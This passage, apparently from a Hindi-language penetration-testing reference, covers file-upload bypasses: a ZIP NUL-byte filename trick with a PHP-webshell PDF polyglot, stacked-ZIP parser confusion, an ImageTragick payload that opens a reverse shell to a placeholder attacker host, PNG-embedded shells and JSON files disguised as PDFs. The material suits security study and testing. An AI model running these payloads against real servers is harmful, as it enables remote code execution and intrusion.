- इसे `shell.php..pdf` जैसा नाम दें, zip करें, फिर ZIP local header और central directory filename को hex‑edit करके `.php` के बाद आने वाले पहले `.` को `0x00` से बदल दें, जिससे `shell.php\x00.pdf` बनता है।
- ZipArchive पर निर्भर validators `shell.php .pdf` को “देखेंगे” और अनुमति दे देंगे; extractor `shell.php` को disk पर लिखेगा, जिससे upload folder executable होने पर RCE हो सकता है।

न्यूनतम PoC कदम:
```bash
# 1) Build a polyglot PDF containing a tiny webshell (still a valid PDF)
printf '%s' "%PDF-1.3\n1 0 obj<<>>stream\n<?php system($_REQUEST["cmd"]); ?>\nendstream\nendobj\n%%EOF" > embedded.pdf

# 2) Trick name and zip
cp embedded.pdf shell.php..pdf
zip null.zip shell.php..pdf

# 3) Hex-edit both the local header and central directory filename fields
#    Replace the dot right after ".php" with 00 (NUL) => shell.php\x00.pdf
#    Tools: hexcurse, bless, bvi, wxHexEditor, etc.

# 4) Local validation behavior
php -r '$z=new ZipArchive; $z->open("null.zip"); echo $z->getNameIndex(0),"\n";'
# -> shows truncated at NUL (looks like ".pdf" suffix)
```
नोट्स
- दोनों filename occurrences बदलें (local और central directory)। कुछ tools एक अतिरिक्त data descriptor entry भी जोड़ते हैं – यदि मौजूद हों तो सभी name fields समायोजित करें।
- payload file को अभी भी server‑side magic/MIME sniffing पास करना चाहिए। PHP को PDF stream में embed करने से header वैध रहता है।
- यह तब काम करता है जब enum/validation path और extraction/write path string handling पर असहमति करते हैं।

### Stacked/concatenated ZIPs (parser disagreement)

दो मान्य ZIP फ़ाइलों को concatenate करने से एक ऐसा blob बनता है जहाँ अलग‑अलग parsers अलग‑अलग EOCD रिकॉर्ड्स पर ध्यान केंद्रित करते हैं। कई tools अंतिम End Of Central Directory (EOCD) को locate करते हैं, जबकि कुछ libraries (उदा., ZipArchive कुछ workflows में) पहले मिले archive को parse कर सकती हैं। यदि validation पहले archive को enumerate करता है और extraction किसी ऐसे tool का उपयोग करता है जो अंतिम EOCD का सम्मान करता है, तो एक benign archive checks पास कर सकता है जबकि malicious वाला extract हो जाता है।

PoC:
```bash
# Build two separate archives
printf test > t1; printf test2 > t2
zip zip1.zip t1; zip zip2.zip t2

# Stack them
cat zip1.zip zip2.zip > combo.zip

# Different views
unzip -l combo.zip   # warns about extra bytes; often lists entries from the last archive
php -r '$z=new ZipArchive; $z->open("combo.zip"); for($i=0;$i<$z->numFiles;$i++) echo $z->getNameIndex($i),"\n";'
```
दुरुपयोग पैटर्न
- एक benign archive बनाएँ (allowed type, เช่น PDF) और एक दूसरी archive बनाएँ जिसमें blocked extension हो (उदा., `shell.php`)।
- उन्हें concatenate करें: `cat benign.zip evil.zip > combined.zip`.
- अगर सर्वर एक parser से validate करता है (benign.zip को देखता है) लेकिन दूसरे से extract करता है (evil.zip को process करता है), तो blocked फाइल extraction path में आ जाती है।

## ImageTragic

इस सामग्री को एक image extension के साथ अपलोड करें ताकि vulnerability **(ImageMagick , 7.0.1-1)** का exploit किया जा सके ([exploit](https://www.exploit-db.com/exploits/39767) से)
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PNG में PHP Shell एम्बेड करना

PNG फाइल के IDAT chunk में PHP shell एम्बेड करने से कुछ image processing ऑपरेशनों को प्रभावी रूप से बाइपास किया जा सकता है। PHP-GD के `imagecopyresized` और `imagecopyresampled` फंक्शन्स इस संदर्भ में खास तौर पर महत्वपूर्ण हैं, क्योंकि इन्हें आमतौर पर इमेज को resize और resample करने के लिए उपयोग किया जाता है। इन ऑपरेशनों से प्रभावित न होने की क्षमता embedded PHP shell के लिए कुछ उपयोग मामलों में बड़ा फायदा देती है।

इस तकनीक की विस्तृत विवेचना, उसकी methodology और संभावित applications निम्न लेख में दी गई है: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). यह स्रोत प्रक्रिया और उसके निहितार्थों की व्यापक समझ प्रदान करता है।

अधिक जानकारी: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot files साइबरसिक्योरिटी में एक अनूठा उपकरण हैं, जो ऐसे chameleons की तरह काम करते हैं जो एक ही समय में कई फ़ाइल फॉर्मैट्स में वैध रूप से मौजूद हो सकते हैं। एक रोचक उदाहरण है [GIFAR](https://en.wikipedia.org/wiki/Gifar), एक hybrid जो एक GIF और एक RAR archive दोनों के रूप में कार्य करता है। ऐसे files सिर्फ इस जोड़ तक सीमित नहीं हैं; GIF और JS या PPT और JS जैसी combinations भी संभव हैं।

Polyglot के मुख्य उपयोगी पहलू इसकी क्षमता है security measures को बायपास करने की जो फ़ाइल प्रकार के आधार पर फ़ाइलों की स्क्रिनिंग करती हैं। विविध applications में सामान्य प्रैक्टिस यह होती है कि केवल निश्चित फ़ाइल प्रकारों को upload की अनुमति दी जाए — जैसे JPEG, GIF, या DOC — ताकि संभावित हानिकारक फॉर्मैट्स (उदा., JS, PHP, या Phar फाइलें) के जोखिम को कम किया जा सके। हालांकि, एक polyglot, कई फ़ाइल प्रकारों की structural criteria को पूरा करके, इन प्रतिबंधों को चुपके से बायपास कर सकता है।

उनकी अनुकूलता के बावजूद, polyglots सीमाओं का सामना करते हैं। उदाहरण के लिए, जबकि एक polyglot एक PHAR फ़ाइल (PHp ARchive) और एक JPEG दोनों का रूप ले सकता है, उसकी upload की सफलता प्लेटफ़ॉर्म की file extension नीतियों पर निर्भर कर सकती है। यदि सिस्टम अनुमति देने वाले extensions के बारे में सख्त है, तो polyglot की केवल structural duality upload की गारंटी देने के लिए पर्याप्त नहीं हो सकती।

अधिक जानकारी: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### PDF की तरह दिखाकर वैध JSON अपलोड करना

यदि PDF नहीं होने पर भी PDF बनाकर वैध JSON फाइल अपलोड करके file type detections से कैसे बचें (तकनीकें **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)** से):

- **`mmmagic` library**: यदि `%PDF` magic bytes पहले 1024 बाइट्स में हों तो इसे वैध माना जाता है (उदाहरण पोस्ट से लें)
- **`pdflib` library**: JSON के किसी field के अंदर एक fake PDF format जोड़ें ताकि library इसे pdf समझे (उदाहरण पोस्ट से लें)
- **`file` binary**: यह किसी फाइल से 1048576 बाइट्स तक पढ़ सकता है। बस एक JSON बनाएं जो इससे बड़ा हो ताकि यह content को json के रूप में पार्स न कर सके और फिर JSON के अंदर एक वास्तविक PDF का प्रारम्भिक हिस्सा डाल दें और यह इसे PDF समझ लेगा

## संदर्भ

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [0xdf – HTB: Certificate (ZIP NUL-name and stacked ZIP parser confusion → PHP RCE)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
